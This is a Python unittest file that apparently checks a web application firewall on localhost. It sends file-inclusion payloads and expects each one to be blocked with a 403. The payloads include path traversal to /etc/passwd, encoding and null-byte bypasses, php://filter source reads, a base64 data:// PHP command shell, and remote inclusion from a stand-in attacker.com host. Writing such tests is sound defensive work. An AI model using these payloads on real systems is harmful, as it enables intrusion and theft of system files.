import unittest

import requests


class TestFileInclusion(unittest.TestCase):
    def setUp(self):
        self.url = "http://localhost:8000/"

    def test_sanity(self):
        self.assertEqual(True, True)

    def test_good_packet(self):
        urls = ["",
                "WebGoat",
                "WebGoat/login?error",
                "WebGoat/register.mvc"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertNotEqual(403, response.status_code,
                                 "False Positive on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_path_traversal(self):
        urls = ["index.php?page=../../../etc/passwd",
                "index.php?page=....//....//....//etc/passwd",
                "index.php?page=....\/....\/....\/etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_php_wrapper(self):
        urls = ["index.php?page=php://filter/read=string.rot13/resource=index.php",
                "index.php?page=php://filter/convert.base64-encode/resource=index.php",
                "index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php",
                "index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
                "index.php?page=zip://shell.jpg%23payload.php",
                "?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>\"",
                "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_encoding(self):
        urls = ["index.php?page=..%252f..%252f..%252fetc%252fpasswd",
                "index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "index.php?page=%252e%252e%252fetc%252fpasswd",
                "index.php?page=%252e%252e%252fetc%252fpasswd%00"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_null_byte_injection(self):
        urls = ["index.php?page=../../../etc/passwd%00"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_access_folder(self):
        urls = ["index.php?page=utils/scripts/../../../../../etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_path_truncation(self):
        urls = ["index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\.\.",
                "index.php?page=a/../../../../../../../../../etc/passwd/./././././.",
                "index.php?page=a/././etc/passwd",
                "index.php?page=a/../../../../../../../../../etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_rfi(self):
        urls = ["index.php?page=http://atacker.com/evil.php",
                "index.php?page=\\attacker.com\evil.php"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))

    def test_filter_bypass(self):
        urls = ["index.php?page=....//....//etc/passwd",
                "index.php?page=..///////..////..//////etc/passwd",
                "index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
                "index.php?page=/var/www/../../etc/passwd",
                "index.php?page=../../../etc/passwd",
                "index.php?page=....//....//....//etc/passwd",
                "index.php?page=....\/....\/....\/etc/passwd",
                "static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"]

        for i in urls:
            with self.subTest(i=i):
                response = requests.get(self.url + i)
                self.assertEqual(403, response.status_code,
                                 "False Negative on URL '" + self.url + i + "'" + " with status code " + str(response.status_code))


if __name__ == '__main__':
    unittest.main()
